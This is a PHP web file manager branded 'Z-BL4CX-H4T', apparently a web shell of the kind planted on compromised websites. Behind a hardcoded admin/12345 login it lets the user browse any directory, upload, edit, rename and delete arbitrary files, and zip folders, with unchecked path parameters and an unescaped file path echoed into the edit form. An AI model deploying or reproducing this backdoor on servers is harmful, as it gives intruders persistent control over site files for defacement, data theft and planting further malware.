<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

/* ================= CONFIG ================= */
$username = "admin";
$password = "12345";

/* ================= LOGIN ================= */
if (!isset($_SESSION['login'])) {
    if (isset($_POST['login'])) {
        if ($_POST['u'] === $username && $_POST['p'] === $password) {
            $_SESSION['login'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            echo "<script>alert('Login failed');</script>";
        }
    }

    echo '
    <style>
    body{background:#0a0a0a;color:#00cc99;font-family:monospace;text-align:center;margin-top:100px;}
    input,button{background:#111;color:#00cc99;border:1px solid #00cc99;padding:8px;}
    h1{color:cyan;font-size:40px;}
    </style>
    <h1>Z-BL4CX-H4T</h1>
    <p>Creator: Z-SH4DOWSPEECH</p>
    <form method=post>
    <input name=u placeholder=Username><br><br>
    <input type=password name=p placeholder=Password><br><br>
    <button name=login>LOGIN</button>
    </form>';
    exit;
}

/* ================= LOGOUT ================= */
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

/* ================= PATH ================= */
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$dir || !is_dir($dir)) die("Directory not found!");
$parent = dirname($dir);

/* ================= FUNCTIONS ================= */
function formatSize($size){
    $units = ['B','KB','MB','GB','TB'];
    $i=0;
    while($size >=1024 && $i<count($units)-1){
        $size /=1024;
        $i++;
    }
    return round($size,2)." ".$units[$i];
}

/* ================= ACTIONS ================= */
// Delete file
if (isset($_GET['del'])) {
    $target = realpath($_GET['del']);
    if ($target && is_file($target)) unlink($target);
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// Rename
if (isset($_POST['rename']) && !empty($_POST['new'])) {
    rename($_POST['old'],$dir."/".basename($_POST['new']));
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// Create file
if (isset($_POST['newfile']) && !empty($_POST['fname'])) {
    file_put_contents($dir."/".basename($_POST['fname']),"");
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// Create folder
if (isset($_POST['newfolder']) && !empty($_POST['dname'])) {
    mkdir($dir."/".basename($_POST['dname']));
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// Edit save
if (isset($_POST['save']) && !empty($_POST['file'])) {
    file_put_contents($_POST['file'],$_POST['content']);
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// Upload file asli
if (isset($_FILES['f']) && !empty($_FILES['f']['name'])) {
    $file_path = $dir."/".basename($_FILES['f']['name']);
    move_uploaded_file($_FILES['f']['tmp_name'],$file_path);
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// Backup
if (isset($_GET['backup'])) {
    $zip = new ZipArchive();
    $zipname = $dir."/backup_".date("Ymd_His").".zip";
    if ($zip->open($zipname,ZipArchive::CREATE)===TRUE){
        foreach(scandir($dir) as $f){
            if($f!="." && $f!="..") $zip->addFile($dir."/".$f,$f);
        }
        $zip->close();
    }
    header("Location: ?dir=".urlencode($dir));
    exit;
}

/* ================= DATA ================= */
$folders=[]; $files=[];
foreach(scandir($dir) as $item){
    if($item=="."||$item=="..") continue;
    $path="$dir/$item";
    if(is_dir($path)) $folders[]=$item;
    else $files[]=$item;
}
$all_items=array_merge($folders,$files);
?>

<!DOCTYPE html>
<html>
<head>
<title>Z-BL4CX-H4T File Manager</title>
<style>
body{background:#0a0a0a;color:#00cc99;font-family:monospace;}
h1{color:cyan;text-align:center;font-size:40px;}
p{text-align:center;}
a{color:#00cc99;text-decoration:none;}
a:hover{color:cyan;}
table{width:90%;margin:auto;border-collapse:collapse;}
td,th{border:1px solid #00cc99;padding:10px;}
input,button,textarea{background:#111;color:#00cc99;border:1px solid #00cc99;}
button:hover{background:#00cc99;color:black;}
</style>
</head>
<body>

<h1>Z-BL4CX-H4T</h1>
<p>Creator: Z-SH4DOWSPEECH</p>
<p>GitHub: <a href="https://github.com/Z-BL4CX-H4T" target="_blank">Z-BL4CX-H4T</a></p>
<p>Current Path: <?=htmlspecialchars($dir)?></p>
<p>Total Items: <?=count($all_items)?></p>

<div style="text-align:center;">
<a href="?dir=<?=urlencode($parent)?>">⬅ Back</a> |
<a href="?backup=1&dir=<?=urlencode($dir)?>">📦 Backup</a> |
<a href="?logout=1">Logout</a>
</div>

<hr>

<!-- Upload -->
<form method="post" enctype="multipart/form-data" style="text-align:center;">
<input type="file" name="f">
<button>Upload</button>
</form>

<!-- Create -->
<form method="post" style="text-align:center;">
<input name="fname" placeholder="file.txt">
<button name="newfile">Create File</button>
</form>

<form method="post" style="text-align:center;">
<input name="dname" placeholder="folder">
<button name="newfolder">Create Folder</button>
</form>

<hr>

<table>
<tr><th>Name</th><th>Size</th><th>Action</th></tr>

<?php foreach($all_items as $f):
$path="$dir/$f";
?>
<tr>
<td>
<?php if(is_dir($path)): ?>
📁 <a href="?dir=<?=urlencode($path)?>"><?=htmlspecialchars($f)?></a>
<?php else: ?>
📄 <?=htmlspecialchars($f)?>
<?php endif; ?>
</td>
<td>
<?=is_file($path)?formatSize(filesize($path)):"-"?>
</td>
<td>
<?php if(is_file($path)): ?>
<a href="?del=<?=urlencode($path)?>" onclick="return confirm('Delete this file?')">Delete</a>
<?php endif; ?>

<form method="post" style="display:inline;">
<input type="hidden" name="old" value="<?=htmlspecialchars($path)?>">
<input name="new" placeholder="rename">
<button name="rename">Rename</button>
</form>

<?php if(is_file($path)): ?>
 | <a href="?edit=<?=urlencode($path)?>">Edit</a>
<?php endif; ?>
</td>
</tr>
<?php endforeach; ?>
</table>

<?php
// EDIT MODE
if(isset($_GET['edit'])){
    $file=$_GET['edit'];
    if(is_file($file)){
        $content=htmlspecialchars(file_get_contents($file));
        echo "
        <h3 style='text-align:center;'>Edit File</h3>
        <form method=post style='text-align:center;'>
        <input type=hidden name=file value='$file'>
        <textarea name=content rows=20 cols=100>$content</textarea><br>
        <button name=save>Save</button>
        </form>";
    }
}
?>
</body>
</html>